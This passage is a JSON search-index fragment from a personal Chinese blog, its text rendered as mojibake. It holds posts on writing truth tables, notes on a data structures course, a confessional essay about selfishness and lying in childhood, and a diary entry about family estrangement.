**å¦‚æœæ˜¯å¤æ‚è¡¨è¾¾å¼ï¼Œåˆ†æ­¥è®¡ç®—ï¼Œæ¯ä¸ªä¸­é—´ç»“æœå¼€ä¸€æ **ã€‚\n    \n    - **ä¾‹å¦‚è®¡ç®—** ï¼š\n        \n        ```\n        | A | B | C | A âˆ§ B | Â¬C | (A âˆ§ B) âˆ¨ Â¬C |\n        |:-:|:-:|:-:|:-:|:-:|:-:|\n        | 0 | 0 | 0 |  0  |  1  |       1       |\n        | 0 | 0 | 1 |  0  |  0  |       0       |\n        | 0 | 1 | 0 |  0  |  1  |       1       |\n        ```\n        \n    - **ä¸è¦ç›´æ¥è·³åˆ°æœ€ç»ˆç»“æœ**ï¼Œè¿™æ ·å®¹æ˜“å‡ºé”™ã€‚\n3. **è®¡ç®—æ—¶æ³¨æ„é€»è¾‘è¿ç®—çš„ä¼˜å…ˆçº§**ï¼š\n    \n    - **å…ˆè®¡ç®—æ‹¬å·å†…çš„å†…å®¹**ã€‚\n    - **éï¼ˆÂ¬ï¼‰çš„ä¼˜å…ˆçº§æœ€é«˜**ã€‚\n    - **ä¸ï¼ˆâˆ§ï¼‰é«˜äºæˆ–ï¼ˆâˆ¨ï¼‰**ã€‚\n    - **è•´å«ï¼ˆâ†’ï¼‰å¯ä»¥æ‹†è§£æˆ \"Â¬A âˆ¨ B\"** è®¡ç®—ã€‚\n\n---\n\n### **3. æ•°å­— & ç¬¦å·ä¹¦å†™è§„èŒƒ**\n\næ‰‹å†™ä½œä¸šæ—¶ï¼š\n\n- **0 å’Œ 1 è¦æ¸…æ™°ï¼Œåˆ«å†™æˆ o æˆ– l**ï¼ˆå°¤å…¶æ˜¯ç”¨è‰ç¨¿æœ¬æ—¶ï¼‰ã€‚\n- **è¿ç®—ç¬¦å·å†™æ¸…æ¥š**ï¼Œæ¯”å¦‚ï¼š\n    - â€œâˆ§â€ ï¼ˆä¸ï¼‰ä¸è¦å†™æˆæ™®é€šçš„â€œ^â€ã€‚\n    - â€œâˆ¨â€ ï¼ˆæˆ–ï¼‰ä¸è¦å†™æˆ â€œVâ€ã€‚\n    - â€œÂ¬â€ ï¼ˆéï¼‰å¯ä»¥ç›´æ¥å†™æˆ \"Â¬\" æˆ– \"~\"ï¼ˆçœ‹è€å¸ˆä¹ æƒ¯ï¼‰ã€‚\n- **è¡¨è¾¾å¼å¤æ‚æ—¶ï¼Œæ‹¬å·ä¸€å®šè¦å†™å…¨**ï¼Œå¦åˆ™å¯èƒ½å½±å“è®¡ç®—é¡ºåºã€‚\n\n---\n\n### **4. è¡Œæ•°ä¸€å®šè¦å¯¹é½**\n\n- ä¹¦å†™æ—¶ï¼Œ**æ¯ä¸€è¡Œéƒ½è¦æ•´é½**ï¼Œåˆ«è®©æŸäº›æ•°æ®åå·¦ã€æŸäº›åå³ï¼Œå®¹æ˜“å¯¼è‡´è®¡ç®—é”™è¯¯ã€‚\n- å¦‚æœæ˜¯è¡¨æ ¼å½¢å¼ï¼Œæœ€å¥½ç”¨**ç›´å°º**ç”»çº¿ï¼Œè¿™æ ·ä½œä¸šçœ‹èµ·æ¥æ•´æ´ï¼Œæ‰¹æ”¹ä¹Ÿæ–¹ä¾¿ã€‚\n\n---\n\n### **5. é¿å…å¸¸è§é”™è¯¯**\n\n- **å˜é‡æ’åˆ—é¡ºåºé”™äº†**  \n    âŒ **é”™è¯¯ä¾‹å­ï¼š**\n    \n    ```\n    | A | B |\n    |:-:|:-:|\n    | 0 | 1 |\n    | 1 | 0 |\n    | 0 | 0 |\n    | 1 | 1 |\n    ```\n    \n    âœ… **æ­£ç¡®æ–¹å¼ï¼ˆæŒ‰ç…§äºŒè¿›åˆ¶é€’å¢ï¼‰ï¼š**\n    \n    ```\n    | A | B |\n    |:-:|:-:|\n    | 0 | 0 |\n    | 0 | 1 |\n    | 1 | 0 |\n    | 1 | 1 |\n    ```\n    \n- **ç›´æ¥å†™æœ€ç»ˆç»“æœï¼Œè€Œä¸å†™ä¸­é—´æ­¥éª¤**\n    \n    - è¿™æ ·è€å¸ˆå¯èƒ½ä¼šæ‰£æ­¥éª¤åˆ†ï¼Œå»ºè®®**å…ˆå†™ä¸­é—´é€»è¾‘è¿ç®—ï¼Œå†å†™æœ€ç»ˆç­”æ¡ˆ**ã€‚\n- **è®¡ç®— â€œè•´å«ï¼ˆâ†’ï¼‰â€ æ—¶æé”™è§„åˆ™**\n    \n    - è®°ä½ åªæœ‰åœ¨ **A=1, B=0 æ—¶ä¸º 0**ï¼Œå…¶ä»–æƒ…å†µéƒ½æ˜¯ 1ã€‚\n\n---\n\n### **æ€»ç»“**\n\nâœ” **ç”»è¡¨æ ¼/å¯¹é½æ•°æ®ï¼Œè®©ä½œä¸šæ¸…æ™°**ã€‚  \nâœ” **æŒ‰äºŒè¿›åˆ¶é¡ºåºåˆ—å˜é‡**ï¼Œåˆ«ä¹±æ’åˆ—ã€‚  \nâœ” **å¤æ‚è¡¨è¾¾å¼åˆ†æ­¥è®¡ç®—ï¼Œæ¯ä¸ªè¿ç®—å•ç‹¬ä¸€åˆ—**ã€‚  \nâœ” **ç¬¦å·å†™æ¸…æ¥šï¼Œè¿ç®—ä¼˜å…ˆçº§æ­£ç¡®**ã€‚  \nâœ” **ç”¨ç›´å°ºç”»çº¿ï¼ˆå¦‚æœè€å¸ˆè¦æ±‚è§„èŒƒæ•´é½ï¼‰**ã€‚\n","tags":["å­¦ä¹ ","æ•°å­¦","æ³¨æ„äº‹é¡¹"],"categories":["æ—¥å¸¸å­¦ä¹ ","ç¦»æ•£æ•°å­¦"]},{"title":"æ•°æ®ç»“æ„è¯¾ç¨‹æ³¨æ„äº‹é¡¹","url":"/2025/02/18/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-ke-cheng-zhu-yi-shi-xiang/","content":"# æ•°æ®ç»“æ„è¯¾ç¨‹æ³¨æ„äº‹é¡¹\n\n## è¯¾ç¨‹è€ƒæ ¸æ€»è§ˆ\n![](/images/æ•°æ®ç»“æ„è¯¾ç¨‹æ³¨æ„äº‹é¡¹/æ€»è§ˆ.jpg)\n\n## **å°ç»„ä½œä¸šï¼š**\nÂ· ä¸ªäººå°ä¸»é¢˜\nÂ· åŒåŒ¿åè¯„åˆ†\nÂ· pptè½¬pdf\nÂ· è¯„åˆ†é‡è¡¨\n\n## **å°ç­è®¨è®º**ï¼š\n![è®¨è®º](/images/æ•°æ®ç»“æ„è¯¾ç¨‹æ³¨æ„äº‹é¡¹/è®¨è®º.jpg)\n\n\n### **ä¸ªäººèµ„æ–™**\néœ€è¦è¡¨è¾¾æ¸…æ¥šï¼Œæ¶‰åŠç®—æ³•ç”¨äººèƒ½çœ‹æ‡‚çš„ä¸œè¥¿æ¥å†™ï¼Œåƒè®ºæ–‡ä¸€æ ·å†™ã€‚\næ–‡å­—è¶Šå¤šçœ‹çš„æ‡‚çš„äººè¶Šå°‘ï¼Œå–„ç”¨å›¾è¡¨ï¼Œè¯­è¨€ç®€ç»ƒæ¸…æ™°ã€‚\n![](/images/æ•°æ®ç»“æ„è¯¾ç¨‹æ³¨æ„äº‹é¡¹/ä¸ªäººèµ„æ–™.jpg)\n\n### å°ç»„æŠ¥å‘Šï¼š\nè®¨è®ºè¯¾éœ€è¦å½•éŸ³åµŒå…¥ã€‚\n![](/images/æ•°æ®ç»“æ„è¯¾ç¨‹æ³¨æ„äº‹é¡¹/å°ç»„æŠ¥å‘Š.jpg)\n\n## **çº¿ä¸Šå­¦ä¹ ï¼š**\nÂ· åˆ·å¤Ÿæ—¶é•¿500åˆ†é’Ÿ\nÂ· æœ‰çº¿ä¸Šæµ‹è¯•ï¼Œæ‹ç…§ä¸Šä¼ \n\n## **å®éªŒï¼š**\n![](/images/æ•°æ®ç»“æ„è¯¾ç¨‹æ³¨æ„äº‹é¡¹/å®éªŒ.jpg)\n\n**åœ¨è¶…æ˜Ÿå¹³å°ä¸Šæäº¤**ã€‚\n\n","tags":["å­¦ä¹ ","æ³¨æ„äº‹é¡¹","æ•°æ®ç»“æ„"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"å¿æ‚”å½•ï¼Ÿ","url":"/2025/02/09/sheng-huo/za-tan/chan-hui-lu/","content":"æœ€è¿‘å¾ˆå–œæ¬¢GDã€‚\n{% aplayer \"ë‹ˆê°€ ë­”ë° (Who You?)\" \"G-Dragon\" \"/music/Who You.mp3\" \"/images/COUP D'ETAT.jpg\" %}\n---\n\nå°æ—¶å€™ï¼Œçˆ¶æ¯é—®è¿‡æˆ‘ä¸€ä¸ªé—®é¢˜ï¼šâ€œä½ æ˜¯åˆ©å·±ä¸»ä¹‰è€…ï¼Œè¿˜æ˜¯åˆ©ä»–ä¸»ä¹‰è€…ï¼Ÿâ€\n\næˆ‘çŸ¥é“è¿™ä¸¤ä¸ªè¯çš„æ„æ€ï¼Œä¸€ä¸ªæ˜¯è‡ªç§ï¼Œä¸€ä¸ªæ˜¯æ— ç§ã€‚ä½†å½“æ—¶çš„æˆ‘ç­”ä¸ä¸Šæ¥ã€‚è¯¾æœ¬é‡Œè¯´ï¼Œè‡ªç§æ˜¯åçš„ï¼Œæˆ‘ä»¬åº”è¯¥æ— ç§å¥‰çŒ®ï¼Œæˆä¸ºä¸€ä¸ªå¥½äººã€‚æˆ‘ä¹Ÿæ›¾åŠªåŠ›å»åšã€‚æˆ‘æƒ³è¿‡ææ¬¾ï¼Œåšåˆ°æ‹¾é‡‘ä¸æ˜§ï¼ŒæŠŠæ—§è¡£æœé€ç»™è´«å›°çš„å­©å­ã€‚å¯æˆ‘å‘ç°ï¼Œå‘¨å›´çš„äººä¼¼ä¹å¹¶ä¸æ˜¯è¿™æ ·ã€‚\n\nç­é•¿è§‰å¾—æˆ‘çš„ç»ç’ƒæ˜Ÿæ˜Ÿå¾ˆå¥½çœ‹ï¼Œä¾¿ä»¥â€œå€Ÿå»ç©ç©â€ä¸ºç”±æ‹¿èµ°äº†è¿™é¢—æˆ‘è¡¨å§é€ç»™æˆ‘çš„æ˜Ÿæ˜Ÿï¼Œå‡ å¹´è¿‡å»ä¹Ÿæ²¡è¿˜ï¼Œä¼¼ä¹æ—©å·²å¿˜è®°è¿™å›äº‹ã€‚ä½†æˆ‘ä¸€ç›´è®°ç€ã€‚\nè€å¸ˆä¸ç»™æˆ‘å‘ä¸‰å¥½å­¦ç”Ÿå¥–çŠ¶ï¼Œå› ä¸ºå¥¹è®¤å®šæˆ‘æ˜¯ä¸€å¹´çº§å°±ä¼¤å®³åŒå­¦çš„â€œåå­©å­â€ã€‚å³ä½¿æˆ‘åæ¥è€ƒäº†å…¨ç­ç¬¬äºŒï¼Œå’Œç¬¬ä¸€ååŒåˆ†ï¼Œå¥¹ä»ç„¶ä¸è‚¯ç»™æˆ‘é‚£å¼ å¥–çŠ¶ã€‚å¯æˆ‘è®°å¾—é‚£æ¬¡â€œä¼¤å®³â€ï¼Œä¸è¿‡æ˜¯å› ä¸ºä¸€ä¸ªåŒå­¦ä¸æ–­é—®æˆ‘é‡å¤çš„é—®é¢˜ï¼Œæˆ‘ä¸€ééå›ç­”ï¼Œä»–å´åƒå¬ä¸æ‡‚ä¸€æ ·ï¼Œæˆ‘æ°”æ€¥ä¹‹ä¸‹ç”¨å¡‘æ–™ç®¡æˆ³äº†ä»–ï¼Œæ²¡æ§åˆ¶å¥½åŠ›é“ï¼Œä¸å°å¿ƒæˆ³åˆ°äº†ä»–çš„çœ¼ç›ã€‚\n\nå¥¶å¥¶è´£å¤‡æˆ‘ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªå­¦æœŸåªæ‹¿äº†â€œä¼˜ç§€å°‘å…ˆé˜Ÿå‘˜â€ï¼Œè€Œä¸æ˜¯ä¸‰å¥½å­¦ç”Ÿã€‚å¯æ˜¯ï¼Œæˆ‘ä¸€å¹´çº§å°±è¢«é€‰ä¸ºå°‘å…ˆé˜Ÿå‘˜ï¼Œè¿™æœ¬æ˜¯ä¸€ä¸ªä¼˜ç§€çš„è¯æ˜ã€‚ç„¶è€Œï¼Œçœ‹ç€é‚£å¼ è¢«å¥¹æ‰æˆçº¸å›¢çš„å¥–çŠ¶ï¼Œæˆ‘å¼€å§‹æ€è€ƒâ€”â€”æˆ‘æ˜æ˜å¾ˆå¥½ï¼Œå¯ä¸ºä»€ä¹ˆæˆ‘ä¸æ˜¯å‘¢ï¼Ÿ\n\nä¸–ç•Œå¹¶ä¸æ— ç§ï¼Œè€Œæˆ‘ä¹Ÿå­¦ä¼šäº†è‡ªç§ã€‚\n\næˆ‘å‘æœ‹å‹å€¾è¯‰ç§˜å¯†ï¼Œå†³è£‚åï¼Œå¥¹åœ¨äººæœ€å¤šçš„åœ°æ–¹å¤§å–Šæˆ‘æ˜¯ä¸ªâ€œæ²¡å¦ˆçš„å­©å­â€ã€‚\nå¤§å®¶æ‰¾æˆ‘ç©ï¼Œå´æ€»è®©æˆ‘å½“â€œåäººâ€ï¼Œå› ä¸ºæˆ‘é•¿å¾—é«˜å¤§å†·æ·¡ï¼Œé€‚åˆåšè¢«â€œå¥½äººâ€æŠ“æ•çš„åæ´¾ã€‚\nå’Œæœ‹å‹ç©çŒœæ‹³ï¼Œè¾“äº†è¦è¢«æ‰“ä¸€å·´æŒã€‚æˆ‘è¢«æ‰“äº†å¾ˆå¤šä¸‹ï¼Œä»–ä»¬ç¬‘å¾—å¾ˆå¼€å¿ƒã€‚\n\nå°æ—¶å€™ï¼Œæˆ‘ä¸æ‡‚ï¼Œé•¿å¤§äº†ï¼Œæˆ‘æ‡‚äº†ä¸€äº›ã€‚\næˆ‘å­¦ä¼šäº†ç¼–ç»‡è°è¨€ï¼Œè®©ä»–ä»¬å¼€å¿ƒã€‚\næˆ‘å­¦ä¼šäº†æå‰é¢„æµ‹ä»–ä»¬çš„ååº”ï¼Œå†³å®šè¦ä¸è¦å‘Šè¯‰ä»–ä»¬äº‹æƒ…ã€‚\næˆ‘å­¦ä¼šäº†æ’’è°ï¼Œè®©åŒå­¦ç›¸ä¿¡æˆ‘æœ‰ä¸ªåŒèƒèƒå§å§â€”â€”é‚£å…¶å®åªæ˜¯æˆ·å£æœ¬ä¸Šå¤šä½™çš„ä¸€ä¸ªç™»è®°åã€‚\næˆ‘å­¦ä¼šäº†æé€ æ•…äº‹ï¼Œè¯´è‡ªå·±æ¡åˆ°ä¸€ç™¾å…ƒæ‹¾é‡‘ä¸æ˜§ï¼Œæƒ³å¾—åˆ°å¤¸å¥–ï¼Œå´æ¢æ¥ä¸€å£°â€œä½ çœŸå‚»â€çš„è®¥ç¬‘ã€‚\næˆ‘å­¦ä¼šäº†éª—ç½‘å‹ï¼Œè¯´è‡ªå·±è·³çº§äº†ï¼Œå’Œä»–ç°åœ¨æ˜¯åŒä¸€ä¸ªå¹´çº§ã€‚\n\næˆ‘å½“äº†å¾ˆå¤šå¹´çš„éª—å­ï¼Œä¸ºäº†å¡‘é€ ä¸€ä¸ªæ›´â€œå®Œç¾â€çš„è‡ªå·±ã€‚\nè‡ªç§ï¼Œæ˜¯ä¸ªåè¯ï¼Œè€Œæˆ‘å°±æ˜¯è¿™æ ·çš„äººã€‚\n\n\n---\n\nå¯æ˜¯ï¼Œç°åœ¨çš„æˆ‘ç´¯äº†ã€‚\n\nè°è¨€è¯´å‡ºå£å¾ˆç®€å•ï¼Œç»´æŠ¤å´å¾ˆç´¯ã€‚\nè¿™ç§ç–²æƒ«è®©æˆ‘é€‰æ‹©äº†è¯´å®è¯ã€‚\näºæ˜¯ï¼Œæˆ‘æˆäº†æœ€è¯šå®çš„äººï¼Œå› ä¸ºæˆ‘åªè¯´å®è¯ã€‚\nç°åœ¨çš„äººä¸çŸ¥é“ï¼Œæˆ‘æ›¾æ˜¯ä¸ªæ»¡å£è°è¨€çš„è‡ªç§é¬¼ã€‚\n\nä½†å†…æ ¸å¹¶æ²¡æœ‰å˜ã€‚\nåˆ©å·±ä¸»ä¹‰åªæ˜¯è¢«åŒ…è£¹èµ·æ¥ï¼Œæˆä¸ºæˆ‘æˆé•¿çš„æ¨ªå‘æ ¹åŸºã€‚\næˆ‘å˜å¾—æ²‰é»˜ï¼Œå¯¹å‘¨å›´çš„ä¸€åˆ‡å¤šäº†äº›ä¸ä¿¡ä»»ã€‚\næˆ–è®¸åªæ˜¯å› ä¸ºï¼Œæˆ‘è§‰å¾—å¤§å®¶æœ¬å°±æ˜¯è‡ªç§çš„å§ã€‚\nå¤šè¯´æ— ç›Šï¼Œæ²‰é»˜æ˜¯é‡‘ã€‚\n\nè‡ªç§ï¼Œæ˜¯æ•™æé‡Œçš„åè¯ã€‚æ— ç§ï¼Œæ˜¯æˆ‘ä»¬è¯¥æ¨å´‡çš„ç¾å¾·ã€‚\nä½†æˆ‘æ²¡æœ‰é‚£ä¹ˆä¼Ÿå¤§ã€‚\nå½“æˆ‘å‘ç°å¤§å®¶éƒ½æ˜¯è¿™æ ·æƒ³çš„æ—¶å€™ï¼Œåè€Œæ„Ÿåˆ°å®‰å¿ƒã€‚\næ—¢ç„¶æ‰€æœ‰äººéƒ½æ˜¯åäººï¼Œé‚£æˆ‘ä¹Ÿå½“ä¸ªåäººï¼Œå½“ä¸ªæœ€é»‘æš—çš„åäººï¼Œè¿™æ ·ä¹ŸæŒºé…·çš„ã€‚\n\n\n---\n\néƒ½è¯´ç«¥å¹´å†³å®šäº†ä¸€ä¸ªäººçš„ä¸€ç”Ÿã€‚\næˆ‘æ¸…é†’åœ°åº¦è¿‡äº†æˆ‘çš„ç«¥å¹´ã€‚\n\næˆ‘ä¸€ç›´æƒ³åšä¸ä¼—ä¸åŒçš„é‚£ä¸€ä¸ªï¼Œä½†æˆ‘çŸ¥é“ï¼Œè¿™ä¸ªä¸–ç•Œä¸Šæœ‰å¾ˆå¤šäººå’Œæˆ‘ä¸€æ ·ã€‚\næ‰€ä»¥æˆ‘å°½é‡é¿å…å–œæ¬¢çƒ­é—¨çš„ä¸œè¥¿ï¼Œé¿å…æˆä¸ºå¤§å¤šæ•°ã€‚\n\nå¯æ˜¯è°ä¼šçœ‹çœ‹æˆ‘å‘¢ï¼Ÿ\nçˆ¸çˆ¸å¦ˆå¦ˆæŠŠç›®å…‰æ”¾åœ¨å¼Ÿå¼Ÿèº«ä¸Šï¼Œå§‘å¦ˆå…³æ³¨ç€è¡¨å¦¹ï¼Œå¥¶å¥¶å…³å¿ƒçˆ¸çˆ¸å’Œå§‘å¦ˆã€‚\næˆ‘å¤ªè‡ªç§äº†ï¼Œæˆ‘æƒ³è¦ç‹¬å±äºæˆ‘çš„çˆ±ã€‚\n\nå¯æˆ‘çš„çˆ±ï¼Œåƒæ˜¯æ‹¼å‡‘èµ·æ¥çš„ã€‚\nä»–ä»¬åœ¨çˆ±åˆ«äººçš„æ—¶å€™ï¼Œé¡ºä¾¿æ‹¿ä¸€ç‚¹åˆ†ç»™æˆ‘ã€‚\nä½†æˆ‘æƒ³è¦çš„æ˜¯ä¸€é¢—å®Œæ•´çš„ã€åªå±äºæˆ‘çš„çˆ±å•Šâ€¦â€¦\n\næˆ‘çŸ¥é“ä½ ä¼šè¯´â€œå¾ˆå¤šäººéƒ½çˆ±ä½ â€ã€‚\nå¯æˆ‘å°±æ˜¯è¿™ä¹ˆæ¶åŠ£ã€‚\næˆ‘æƒ³è¦ä¸€é¢—å®Œæ•´çš„ï¼Œç‹¬ä¸€æ— äºŒçš„ã€‚\næ¯•ç«Ÿï¼Œæˆ‘ä»æ¥éƒ½ä¸å–œæ¬¢åˆ«äººå‰©ä¸‹çš„ä¸œè¥¿ã€‚\næ¯•ç«Ÿï¼Œæˆ‘ä¸€ç›´æ˜¯è‡ªç§çš„å­©å­ï¼Œåˆ©å·±ä¸»ä¹‰è‡³ä¸Šçš„äººã€‚\n","tags":["ç”Ÿæ´»","æ‚è°ˆ"],"categories":["æ‚è°ˆ"]},{"title":"å®¶","url":"/2025/02/09/sheng-huo/ji-lu/jia/","content":"# å®¶\n\n## å›å®¶\n**å¥¶å¥¶å¾—å»çœ‹ç—…ï¼Œæ˜å¤©æˆ‘è¦é™ªå¥¹å»çˆ¸å¦ˆå®¶ã€‚**  \n\nå¥¶å¥¶è„–é¢ˆç—›å¾ˆä¹…äº†ï¼Œè€³æœµä¹Ÿç—›ï¼Œå£°å¸¦åˆæ¸æ¸å˜¶å“‘èµ·æ¥ï¼Œä¸€ç‚¹éŸ³éƒ½æ²¡æœ‰äº†ã€‚å¾ˆä¸ä¹è§‚ã€‚å¥¶å¥¶ç¬‘ç€è¯´è‡ªå·±è¦å˜æˆè‹å“‘äººäº†ï¼Œæˆ‘ä¸è‚¯ï¼Œæ‹‰ç€å¥¹å»çœ‹ç—…ï¼Œå§‘å¦ˆè¯´å…ˆå»é•¿æ²™çœ‹çœ‹ã€‚\nçˆ¶äº²å¤±ä¸šåæœ‰äº†ç©ºé—²ï¼Œæ­£å¥½å¯ä»¥å¼€è½¦å¸¦å¥¶å¥¶å»é•¿æ²™æ¹˜é›…ã€‚ä½†è¿™æ„å‘³ç€ï¼Œæˆ‘è¦å…ˆåœ¨çˆ¸å¦ˆå®¶ä½ä¸€æ™šï¼Œç¬¬äºŒå¤©è®©çˆ¶äº²å¼€è½¦å»æ¹˜é›…ã€‚çœ‹å®Œç—…åï¼Œè¿˜è¦å›å»å‡ å¤©ï¼Œç»™å¤–å©†å¤–å…¬ä»¬æ‹œå¹´å•Šè¿™ç±»ã€‚  \n\nä¸è¿‡æˆ‘ä¸å¤ªæƒ³å›å»ã€‚æˆ‘å¯¹çˆ¶æ¯æ²¡æœ‰å¾ˆäº²çš„å…³ç³»ï¼Œå†åŠ ä¸Šä¹‹å‰å‘ç”Ÿçš„ç§ç§ä¸å¿«ï¼Œæˆ‘æ€•åœ¨é‚£é‡Œå¤šå‘†å‡ å¤©åˆæ»‹ç”Ÿæˆ‘å¯¹çˆ¶æ¯çš„åŒæ¶æ„Ÿã€‚\næƒ³å°‘å¾…ä¸€å¤©æ˜¯ä¸€å¤©ï¼Œå¿™å®Œå¿«ç‚¹å›æ ¡å§ï¼Œä¹Ÿå¿«å¼€å­¦äº†ã€‚\n\n---\n**çªç„¶å¾ˆæƒ³åéœ²ä¸€ä¸‹è‡ªå·±çš„ä¸å¿«ã€‚æµ…æµ…æŠ±æ€¨ä¸€ä¸‹å§ã€‚**\n## ç”Ÿæ—¥\n**æˆ‘æƒ³èµ·å»å¹´çš„ç”Ÿæ—¥ã€‚**  \n**æå‰é¢„å‘Šï¼Œæ»¡æ€€æœŸå¾…ï¼Œä¸“ç¨‹å›å®¶ï¼Œç»“æœå¾—åˆ°çš„å´æ˜¯â€”â€”**  \n> â€œä½ ç”Ÿæ—¥ä¸ä»£è¡¨ä»Šå¤©ä½ ä¼˜å…ˆã€‚â€  \n\n**æ— äººåœ¨æ„ï¼Œæ— äººåœ¨ä¹ã€‚**  \næˆ‘è‡ªå·±æé’±ä¹°äº†ç”Ÿæ—¥è›‹ç³•ï¼Œä¸€ä¸ªäººèººåœ¨æ²¡æœ‰é“ºåºŠçš„â€œæˆ‘çš„æˆ¿é—´â€é‡Œï¼Œè¢«å¯’å†·åŒ…è£¹ï¼Œä¸€ä¸ªäººæ‰“è½¦å»é«˜é“ç«™å›å­¦æ ¡ã€‚\n\næˆ‘ä¸æƒ³å»ã€‚  \né‚£é‡Œï¼Œä¸æ˜¯å®¶ã€‚  \n\næˆ‘ç†è§£æˆå¹´äººå¿™ç¢Œï¼Œæˆ‘ç†è§£ç”Ÿæ´»çš„ç°å®ã€‚  \nä½†æˆ‘ä¹Ÿæƒ³ï¼Œå“ªæ€•ä¸€æ¬¡ï¼Œæˆä¸ºä¸€ä¸ªå¯ä»¥**éšæ„æ’’å¨‡çš„å­©å­**ã€‚  \næˆ‘ä¹Ÿæƒ³ï¼Œåœ¨ç”Ÿæ—¥è¿™ä¸€å¤©ï¼Œè‡ªå·±å¯ä»¥è¢«ä¼˜å…ˆè€ƒè™‘ã€‚  \næˆ‘çŸ¥é“ï¼Œç”Ÿæ—¥å¹¶ä¸æ˜¯é‡è¦çš„ä¸œè¥¿ï¼Œæˆ‘ç†è§£ä¸€åˆ‡ï¼Œä½†é‚£å¤©ï¼Œæˆ‘æƒ³åšä¸ªå­©å­ã€‚  \n\n**æˆ‘æƒ³æ”¶åˆ°ä»–ä»¬çš„ç¤¼ç‰©ï¼Œä¸€èµ·åƒè›‹ç³•ï¼Œå”±ç”Ÿæ—¥æ­Œï¼Œæˆ´ç”Ÿæ—¥å¸½ï¼Œå¹èœ¡çƒ›ï¼Œè®¸æ„¿ã€‚**  \né‚£ä¸€åˆ»ï¼Œå“ªæ€•æ˜¯å‡è±¡ï¼Œä¹Ÿè®©æˆ‘æœ‰å¸Œæœ›ï¼Œå“ªæ€•æ˜¯çŸ­æš‚çš„æ¢¦ï¼Œä¹Ÿè®©æˆ‘ç›¸ä¿¡æ„¿æœ›ä¼šå®ç°ã€‚  \n**æ¯•ç«Ÿï¼Œä»–ä»¬æ›¾ç»è¯´è¿‡ï¼Œç”Ÿæ—¥è¿™å¤©ï¼Œæˆ‘ä¼˜å…ˆã€‚**  \n\nä½†å®é™…çš„æƒ…æ™¯æ˜¯ï¼Œæ‰€æœ‰äººéƒ½ä¸åœ¨æ„ã€‚  \n**é‚£æˆ‘å›å»ï¼Œåˆæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ**  \næˆ‘æ—©å·²ä¹ æƒ¯ç‹¬ç«‹ï¼Œå†·æ¼ ï¼Œå­¤ç‹¬ï¼Œç–²æƒ«ã€‚  \næˆ‘ç†è§£æˆå¹´äººçš„åˆ©ç›Šäº¤æ¢ï¼Œä¹ŸçŸ¥é“å…¬ç†ä¸æ˜¯é å˜´è¯´å°±èƒ½å®ç°çš„ã€‚  \n**ä½†å°±ç”Ÿæ—¥è¿™ä¸€å¤©ï¼Œæˆ‘æƒ³ä»»æ€§ã€‚**  \n\n---\n\n## é«˜ä¸‰\n**æˆ‘æƒ³èµ·é«˜ä¸‰çš„æ—¶å€™ã€‚**  \næˆ‘æ¯å¤©éƒ½è¢«å‹åŠ›å‹å¾—å–˜ä¸è¿‡æ°”ï¼Œçœ‹ç€æ•°å­¦ç‰©ç†çš„è¯•å·æ¯«æ— èµ·è‰²ï¼ŒåŒ–å­¦ç”Ÿç‰©æˆç»©ä¸å°½äººæ„ï¼Œè¯­æ–‡è‹±è¯­åœæ»ä¸å‰ï¼Œ**ä¸æ¢¦æ ¡ä¹‹é—´çš„è·ç¦»ï¼Œè¶Šæ¥è¶Šè¿œã€‚**  \n\næˆ‘ä¾æ—§æ’‘ç€è‡ªå·±ã€‚  \n\næˆ‘è·Ÿå¥¶å¥¶è¯´ï¼Œ**æ¯å¤©éª‘å•è½¦å›å®¶å¤ªç´¯ï¼Œèƒ½ä¸èƒ½ç§Ÿä¸ªæˆ¿å­ï¼Ÿ**  \nåˆæ‹…å¿ƒä¸€ä¸ªäººä½ä¼šé”™è¿‡ä¸Šè¯¾æ—¶é—´ï¼Œä¸æƒ³å¸¦ç”µå­äº§å“å¹²æ‰°å­¦ä¹ ï¼Œ**äºæ˜¯è®©å¥¶å¥¶æ¥é™ªæˆ‘ï¼Œç»™æˆ‘åšé¥­ï¼Œå«æˆ‘èµ·åºŠã€‚**  \n\nå¯æ˜¯åœ¨å­¦æ ¡é‡Œï¼Œçœ‹ç€åˆ«äººçš„çˆ¶æ¯ç»™ä»–ä»¬é€é¥­ï¼Œå¸¦ä»–ä»¬å‡ºå»åƒå¥½åƒçš„ï¼Œæ‰“ç”µè¯å˜˜å¯’é—®æš–â€¦â€¦  \næˆ‘å¿ƒé‡Œæ€»æ˜¯æœ‰äº›æ‚²ä¼¤ã€‚  \n\n> **çˆ¸çˆ¸å¦ˆå¦ˆä»€ä¹ˆæ—¶å€™ä¼šç»™æˆ‘æ‰“ç”µè¯ï¼Ÿ**  \n> **çˆ¸çˆ¸å¦ˆå¦ˆä¼šä¸ä¼šç»™æˆ‘å‘é›¶èŠ±é’±ï¼Œè®©æˆ‘å¤šåƒç‚¹å¥½çš„ï¼Ÿ**  \n> **çˆ¸çˆ¸å¦ˆå¦ˆä¼šä¸ä¼šæŠ½ç©ºå¼€è½¦æ¥çœ‹æˆ‘ï¼Œç»™æˆ‘ä¸€ä¸ªæƒŠå–œï¼Ÿ**  \n\nç­”æ¡ˆæ˜¯â€”â€”**æ²¡æœ‰ã€‚**  \n\nç”šè‡³ï¼Œåæ¥æˆ‘æ‰çŸ¥é“ï¼Œä»–ä»¬ä¸€ç›´åœ¨ç ”ç©¶ï¼Œæˆ‘åˆ°åº•èƒ½ä¸èƒ½è€ƒä¸Šæœ¬ç§‘ã€‚  \n**ä¸€æœ¬çš„å­¦æ ¡ï¼Ÿä»–ä»¬ç”šè‡³æ€€ç–‘æˆ‘æ˜¯å¦è€ƒå¾—ä¸Šã€‚**  \n\næˆ‘åªè§‰å¾—**è’è°¬ï¼Œåˆæ‚²å“€ã€‚**  \næˆ‘åœ¨ç¬‘è‡ªå·±ï¼Œ**ä¸ºä»€ä¹ˆè¦æŠŠæ„Ÿæƒ…æ‰˜ä»˜ç»™ä¸¤ä¸ªä»æœªä¸»åŠ¨äº†è§£è¿‡æˆ‘çš„äººï¼Ÿ**  \n\nä»–ä»¬ç”šè‡³ä¸çŸ¥é“æˆ‘å–œæ¬¢åƒä»€ä¹ˆï¼Œç©¿ä»€ä¹ˆï¼Œç”¨ä»€ä¹ˆï¼Œè¿æˆ‘çš„æˆç»©éƒ½ä¸äº†è§£ï¼Œè¿æˆ‘çš„å…´è¶£çˆ±å¥½éƒ½ä¸€æ— æ‰€çŸ¥ã€‚  